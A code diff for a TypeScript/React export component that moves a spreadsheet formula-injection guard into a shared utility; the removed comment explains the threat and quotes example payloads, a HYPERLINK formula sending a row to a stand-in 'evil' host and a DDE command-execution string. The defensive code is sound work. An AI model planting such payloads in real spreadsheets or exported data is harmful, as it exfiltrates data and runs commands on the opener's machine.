@@ -1,3 +1,4 @@
+import { csvCell, deFormula } from '../../utils/spreadsheet';
 import { Fragment, useCallback, useEffect, useMemo, useRef, useState } from 'react';
 import { formatDate, formatDateTime } from '../../utils/date';
 import * as XLSX from 'xlsx';
@@ -209,31 +210,8 @@ const fmt = (iso: string | null): string => {
 
 /** CSV escape: quote always, double interior quotes. Addresses carry commas and
  *  notes carry everything. */
-/** Neutralises a spreadsheet formula before it reaches a cell (ADR-435).
- *
- *  THE EXPORT IS THE ATTACK PATH THIS SYSTEM ACTUALLY HAS. Collected text comes
- *  from a public link that anyone holding the URL can post to, and the one place
- *  it lands in something that INTERPRETS it is a spreadsheet: a `note` or a
- *  `collected_by` of `=HYPERLINK("http://evil/?x="&A1,"Click")` exfiltrates the
- *  row when the admin opens the file, and `+cmd|'/c calc'!A1` is the DDE
- *  variant. React escapes the table, SQLAlchemy parameterises the query — Excel
- *  does neither.
- *
- *  Prefixing with an apostrophe is OWASP's recommendation: the cell renders as
- *  typed and is never evaluated. The character set is OWASP's current one and is
- *  wider than the familiar four — tab, CR and LF are included because a leading
- *  whitespace control character still reaches the formula parser.
- *
- *  Applied to VALUES, not to the whole line, so it runs before the CSV quoting
- *  and before the xlsx writer, which share this helper precisely so the two
- *  formats cannot drift apart on a security control.
- */
-function deFormula(v: unknown): string {
-  const s = String(v ?? '');
-  return /^[=+\-@\t\r\n]/.test(s) ? `'${s}` : s;
-}
-
-const q = (v: unknown): string => `"${deFormula(v).replace(/"/g, '""')}"`;
+// The formula guard lives in utils/spreadsheet.ts (shared with every export).
+const q = csvCell;
 
 /** ADR-429: the EXPORT keeps stored values, deliberately.
  *
